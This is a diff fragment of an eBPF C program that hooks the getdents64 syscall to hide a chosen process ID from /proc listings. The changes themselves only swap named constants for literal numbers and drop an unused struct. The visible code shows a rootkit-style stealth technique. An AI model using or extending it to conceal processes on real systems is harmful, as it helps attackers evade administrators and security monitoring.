@@ -44,15 +44,7 @@ struct event {
   int success;
 };
 
-struct pkt_trace_metadata {
-  __u32 ifindex;
-  __u32 rx_queue;
-  __u16 pkt_len;
-  __u16 cap_len;
-  __u16 flags;
-  __u16 prog_index;
-  int action;
-} __packed;
+
 
 struct {
   __uint(type, BPF_MAP_TYPE_RINGBUF);
@@ -98,7 +90,7 @@ const volatile int target_ppid = 0;
 // of the PID to hide. This becomes the name
 // of the folder in /proc/
 const volatile int pid_to_hide_len = 0;
-const volatile char pid_to_hide[MAXPIDLEN];
+const volatile char pid_to_hide[16];
 
 // struct linux_dirent64 {
 //     u64        d_ino;    /* 64-bit inode number */
@@ -155,7 +147,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
   struct linux_dirent64 *dirp = 0;
   // int pid = pid_tgid >> 32;
   short unsigned int d_reclen = 0;
-  char filename[MAXPIDLEN];
+  char filename[16];
 
   unsigned int bpos = 0;
   unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
@@ -184,7 +176,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
       // ***********
       bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
       bpf_map_delete_elem(&map_buffs, &pid_tgid);
-      bpf_tail_call(ctx, &map_prog_array, PROG_02);
+      bpf_tail_call(ctx, &map_prog_array, 2);
     }
     bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
     bpos += d_reclen;
@@ -194,7 +186,7 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
   // jump back the start of this function and keep looking
   if (bpos < total_bytes_read) {
     bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
-    bpf_tail_call(ctx, &map_prog_array, PROG_01);
+    bpf_tail_call(ctx, &map_prog_array, 1);
   }
   bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
   bpf_map_delete_elem(&map_buffs, &pid_tgid);
